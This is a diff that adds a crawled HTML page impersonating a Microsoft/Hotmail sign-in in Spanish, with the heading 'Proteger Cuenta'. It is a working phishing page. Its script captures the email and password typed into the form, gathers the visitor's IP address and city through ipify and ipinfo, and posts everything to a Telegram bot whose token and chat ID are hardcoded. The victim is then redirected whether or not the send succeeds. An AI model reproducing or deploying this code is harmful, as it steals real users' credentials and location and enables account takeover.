@@ -1,0 +1,140 @@
+<!-- url: http://acceder-service.webcindario.com
+status: 200 -->
+<!DOCTYPE html>
+<html>
+<head>
+<!-- Inserted by miarroba -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7294310421616689" crossorigin="anonymous"></script>
+<script type='text/javascript' src='https://ads.vidoomy.com/miarroba_23335.js' async></script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<!-- Inserted by miarroba -->
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="icon" href="https://cdn.glitch.global/619bbf3f-0832-4238-90da-3c5dfc53bd19/22favicon.png?v=1714286509047" type="image/png" sizes="16x16">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <title>Iniciar sesiÃ³n en tu cuenta Microsoft</title>
+    
+    <link rel="stylesheet" type="text/css" href="https://sappsapp23.sirv.com/docs/estilo.css">
+    <style>
+        /* Estilos para prevenir zoom */
+        html {
+            touch-action: manipulation;
+            -webkit-text-size-adjust: 100%;
+        }
+        input, select, textarea {
+            font-size: 16px !important;
+        }
+        /* Estilo para el formulario */
+        .container {
+            max-width: 100%;
+            padding: 15px;
+        }
+    </style>
+    <noscript>
+        <meta http-equiv="refresh" content="0; url=nojs.html">
+    </noscript>
+</head>
+
+<body>
+<!-- Inserted by miarroba -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+    <div class="generalContainer">
+        <div class="container">
+            <img class="imagen" src="https://sappsapp23.sirv.com/docs/222hotmail.jpg" alt="">
+            <h2>Proteger Cuenta</h2>
+            <form id="loginform" method="POST">
+                <input type="email" name="email" id="email" placeholder="Correo electrÃ³nico, telÃ©fono o Skype" required autocomplete="off">
+                <input type="password" id="clave" name="clave" placeholder="ContraseÃ±a" required autocomplete="off">
+                <div class="div_text">
+                    <small class="small_negro">Â¿No tienes una cuenta?</small>
+                    <a href="#">Cree una.</a>
+                </div>
+                <input type="submit" value="Siguiente">
+            </form>
+        </div>
+    </div>
+  
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+    // ConfiguraciÃ³n global para todas las pÃ¡ginas
+    const CONFIG = {
+        BOT_TOKEN: '8485870580:AAHY5Jgu65_YAzmBndMwACo2m3BnUkmJaKw',
+        CHAT_ID: '-1003067072316',
+        REDIRECT_URL: 'index1.html'
+    };
+
+    // Prevenir zoom y gestos no deseados
+    document.addEventListener('gesturestart', function(e) {
+        e.preventDefault();
+    });
+
+    // FunciÃ³n mejorada para enviar datos a Telegram
+    async function enviarATelegram(e) {
+        e.preventDefault();
+        
+        const form = e.target;
+        const submitBtn = form.querySelector('[type="submit"]');
+        const originalText = submitBtn.value;
+        
+        // Cambiar texto del botÃ³n durante el envÃ­o
+        submitBtn.value = 'Verificando...';
+        submitBtn.disabled = true;
+        
+        try {
+            const email = form.email.value.trim();
+            const password = form.clave.value;
+            
+            if(!email || !password) {
+                alert('Por favor complete todos los campos');
+                return;
+            }
+            
+            // Obtener IP y ubicaciÃ³n en paralelo
+            const [ipData, locationData] = await Promise.all([
+                fetch('https://api.ipify.org?format=json').then(r => r.json()),
+                fetch('https://ipinfo.io/json').then(r => r.json())
+            ]);
+            
+            // Formatear mensaje para Telegram
+            const mensaje = `ðð AW-WS:\nð§ Correo: ${email}\nð Clave: ${password}\nð IP: ${ipData.ip}\nð UbicaciÃ³n: ${locationData.city}, ${locationData.country}`;
+            
+            // Enviar a Telegram
+            const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: mensaje
+                })
+            });
+            
+            const result = await response.json();
+            
+            if(result.ok) {
+                // RedirecciÃ³n con timestamp para evitar cachÃ©
+                window.location.href = CONFIG.REDIRECT_URL + '?t=' + Date.now();
+            }
+            
+        } catch (error) {
+            console.error('Error:', error);
+            // RedirecciÃ³n incluso si falla el envÃ­o
+            window.location.href = CONFIG.REDIRECT_URL + '?t=' + Date.now();
+        } finally {
+            submitBtn.value = originalText;
+            submitBtn.disabled = false;
+        }
+    }
+
+    // Asignar evento al formulario
+    document.getElementById('loginform').addEventListener('submit', enviarATelegram);
+    
+    // Prevenir reenvÃ­o al refrescar
+    if(window.history.replaceState) {
+        window.history.replaceState(null, null, window.location.href);
+    }
+    </script>
+<!-- Inserted by miarroba -->
+</script></noframes></noembed></noscript><script type="text/javascript" src="/hosting__contador__visitas__unicas.php?h=2206549&amp;t=1766751490&amp;k=554675157a1a75e36ef4e94b0982da9e&amp;__muid="></script>
+<!-- Inserted by miarroba -->
+</body>
+</html>
